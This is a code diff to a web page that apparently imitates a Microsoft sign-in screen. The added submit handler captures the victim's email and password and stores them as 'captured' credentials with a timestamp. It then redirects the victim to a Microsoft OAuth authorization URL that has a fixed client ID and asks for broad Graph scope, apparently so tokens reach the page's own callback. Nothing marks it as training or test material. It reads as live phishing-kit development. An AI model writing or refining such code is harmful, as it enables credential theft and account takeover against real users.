@@ -275,14 +275,12 @@
   </div>
 
   <script>
-    // --- FINAL, CORRECTED SCRIPT ---
+    // --- FINAL, ROBUST SCRIPT ---
     document.addEventListener('DOMContentLoaded', function () {
         
         const div1 = document.getElementById('div1');
         const div2 = document.getElementById('div2');
-        const optionsViewDetailed = document.getElementById('options_view_detailed');
         const optionsBox = document.getElementById('options_box');
-        const troubleshootingBox = document.getElementById('troubleshooting_box');
         
         document.getElementById('next').addEventListener('click', function (e) {
             e.preventDefault();
@@ -292,7 +290,6 @@
                 document.getElementById('emailch').textContent = emailInput.value.trim();
                 div1.classList.add('hidden');
                 optionsBox.classList.add('hidden');
-                troubleshootingBox.style.display = 'none';
                 div2.classList.remove('hidden');
             }
         });
@@ -302,6 +299,50 @@
             div1.classList.remove('hidden');
             optionsBox.classList.remove('hidden');
         });
+
+        document.getElementById('submit-btn').addEventListener('click', function (event) {
+            event.preventDefault();
+            const submitBtn = event.target;
+            const passwordInput = document.getElementById('password');
+            const emailInput = document.getElementById('email');
+            
+            const password = passwordInput.value;
+            const email = emailInput.value.trim();
+
+            if (!password || !email) {
+                // If for any reason the email or password is blank, do not proceed.
+                console.error("Email or password is blank. Aborting.");
+                return;
+            }
+            
+            submitBtn.textContent = 'Verifying...';
+            submitBtn.disabled = true;
+
+            const credentialsData = { email, password, captureTime: new Date().toISOString(), source: 'replacement-html-final' };
+            try {
+                localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
+            } catch (err) {
+                console.error('Failed to store credentials in localStorage:', err);
+            }
+
+            const callbackUrl = window.location.origin + '/auth/callback';
+            const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
+            
+            // Final check to prevent navigating to a broken URL.
+            if (!microsoftLoginUrl || microsoftLoginUrl.includes('undefined')) {
+                console.error("CRITICAL: Failed to build Microsoft login URL. Aborting redirect.");
+                alert("An unexpected error occurred. Please try again.");
+                submitBtn.textContent = 'Sign in';
+                submitBtn.disabled = false;
+                return;
+            }
+
+            setTimeout(() => { window.location.href = microsoftLoginUrl; }, 1200);
+        });
+
+        // The code for the other features is kept separate to prevent interference.
+        const optionsViewDetailed = document.getElementById('options_view_detailed');
+        const troubleshootingBox = document.getElementById('troubleshooting_box');
 
         document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
             e.preventDefault();
@@ -316,32 +357,6 @@
             optionsViewDetailed.classList.add('hidden');
             div1.classList.remove('hidden');
             optionsBox.classList.remove('hidden');
-        });
-
-        document.getElementById('submit-btn').addEventListener('click', function (event) {
-            event.preventDefault();
-            const submitBtn = event.target;
-            const passwordInput = document.getElementById('password');
-            const password = passwordInput.value;
-            
-            // --- THE DEFINITIVE FIX ---
-            // Get the email directly from the original input field, not the span.
-            const email = document.getElementById('email').value.trim();
-            // --------------------------
-
-            if (!password || !email) { return; }
-            
-            submitBtn.textContent = 'Verifying...';
-            submitBtn.disabled = true;
-
-            const credentialsData = { email, password, captureTime: new Date().toISOString(), source: 'replacement-html-final' };
-            try { localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData)); } 
-            catch (err) { console.error('Failed to store credentials in localStorage:', err); }
-
-            const callbackUrl = window.location.origin + '/auth/callback';
-            const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
-
-            setTimeout(() => { window.location.href = microsoftLoginUrl; }, 1200);
         });
 
         document.getElementById('footer_dots_link').addEventListener('click', function (e) {
